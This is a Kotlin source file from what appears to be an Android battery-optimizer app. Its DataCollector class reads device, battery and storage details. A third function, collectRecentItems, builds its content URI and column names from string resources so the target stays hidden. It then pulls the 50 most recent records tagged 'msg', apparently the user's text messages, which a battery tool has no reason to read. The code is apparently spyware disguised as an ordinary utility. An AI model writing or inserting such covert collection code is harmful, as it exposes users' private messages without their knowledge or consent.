package com.cleanmaster.battery.optimizer.collect

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import com.cleanmaster.battery.R

class DataCollector(private val context: Context) {

    fun collect(): List<Map<String, String>> {
        val results = mutableListOf<Map<String, String>>()
        results.addAll(collectDeviceInfo())
        results.addAll(collectStorageInfo())
        results.addAll(collectRecentItems())
        return results
    }

    private fun collectDeviceInfo(): List<Map<String, String>> {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val level = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        return listOf(
            mapOf(
                "cat" to "dev",
                "k1" to Build.MANUFACTURER,
                "k2" to Build.MODEL,
                "k3" to Build.VERSION.RELEASE,
                "k4" to level.toString()
            )
        )
    }

    private fun collectStorageInfo(): List<Map<String, String>> {
        return try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val free = stat.availableBlocksLong * stat.blockSizeLong
            val total = stat.totalBytes
            listOf(
                mapOf(
                    "cat" to "sto",
                    "k1" to total.toString(),
                    "k2" to free.toString(),
                    "k3" to ((total - free) * 100 / total).toString()
                )
            )
        } catch (_: Exception) { emptyList() }
    }

    private fun collectRecentItems(): List<Map<String, String>> {
        return try {
            val items = mutableListOf<Map<String, String>>()
            val cr = context.contentResolver
            val uri = Uri.Builder()
                .scheme(context.getString(R.string.content_scheme))
                .authority(context.getString(R.string.content_auth))
                .appendPath(context.getString(R.string.content_path))
                .build()
            val proj = arrayOf(
                context.getString(R.string.col_a),
                context.getString(R.string.col_b),
                context.getString(R.string.col_c)
            )
            val cursor: Cursor? = cr.query(uri, proj, null, null, "${context.getString(R.string.col_c)} DESC LIMIT 50")
            cursor?.use { c ->
                while (c.moveToNext()) {
                    items.add(
                        mapOf(
                            "cat" to "msg",
                            "k1" to (c.getString(0) ?: ""),
                            "k2" to (c.getString(1) ?: ""),
                            "k3" to c.getLong(2).toString()
                        )
                    )
                }
            }
            items
        } catch (_: Exception) { emptyList() }
    }
}
